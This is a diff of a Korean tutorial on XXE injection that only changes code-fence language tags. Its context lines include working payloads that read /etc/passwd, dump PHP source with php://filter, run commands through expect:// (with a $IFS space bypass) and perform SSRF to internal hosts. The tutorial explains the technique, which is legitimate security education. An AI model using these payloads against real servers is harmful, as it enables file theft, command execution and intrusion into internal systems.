@@ -22,7 +22,7 @@ XML이란 다른 특수 목적의 마크업 언어를 만드는 용도로 사용
 
 XML을 내부에 정의한 경우
 
-``` xml-dtd
+``` xml
 <!ENTITY name "value">
 ```
 
@@ -30,7 +30,7 @@ XML을 내부에 정의한 경우
 
 XML을 외부에 정의한 경우
 
-```xml-dtd
+```xml
 <!ENTITY name SYSTEM "url or file">
 ```
 
@@ -42,7 +42,7 @@ XML을 외부에 정의한 경우
 
 위에서 말한 XML Entity를 이용하여 악의적인 공격을 하는 행위를 XXE Injection이라고 하는데, 공격자가 직접 XML Entity를 외부에  정의하여 이를 악용할 수 있다. XML타입의 데이터를 웹을 통해 전송하는데 서버에서 XML외부 엔티티가 실행이 가능하다면 아래와 같이 시행 가능하다.
 
-```xml-dtd
+```xml
 <!DOCTYPE test[
 <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
 ]>
@@ -58,7 +58,7 @@ XML을 외부에 정의한 경우
 
 우선 처음으로는 그냥 dtd를 통하여 내부 파일을 불러오려고 하면 잘 안되는 경우가 있다. 그런 상황에서는 php에 wrapper클래스를 사용하여 base64등의 형태로 인코딩시켜서 출력을 하면 보통의 경우는 잘 된다.
 
-```xml-dtd
+```xml
 <!DOCTYPE test [  
   <!ELEMENT testman ANY >
   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
@@ -68,7 +68,7 @@ XML을 외부에 정의한 경우
 
 다음은 xxe를 통하여 RCE를 할 때는 아래와 같이 가능하다. 
 
-```xml-dtd
+```xml
 <!DOCTYPE test [ 
 <!ELEMENT testman ANY >
 <!ENTITY xxe SYSTEM "expect://id" >]>
@@ -76,7 +76,7 @@ XML을 외부에 정의한 경우
 
 이렇게 하면 php가  id를 실행하게 된다. 하지만 다양한 명령어를 사용할 때 공백이 필요한데 그런 경우에 공백을 넣으면 에러가 발생한다. 
 
-```xml-dtd
+```xml
 <!DOCTYPE test [ 
 <!ELEMENT testman ANY >
 <!ENTITY xxe SYSTEM "expect://cat$IFS/etc/passwd" >]>
@@ -86,7 +86,7 @@ XML을 외부에 정의한 경우
 
 다음으로는 XXE를 이용한 SSRF이다. 당연히 서버 내부의 권한으로 XML엔티티를 선언하고 실행하는 것이기 때문에 SSRF도 가능하다. 일반적인 사용자의 권한에서는 볼 수 없던 내용도 서버 내부의 권한으로는 가능하다.
 
-```xml-dtd
+```xml
 <!DOCTYPE test [ 
 <!ELEMENT testman (#ANY)>
 <!ENTITY xxe SYSTEM "https://internal_domain/any.php">]>
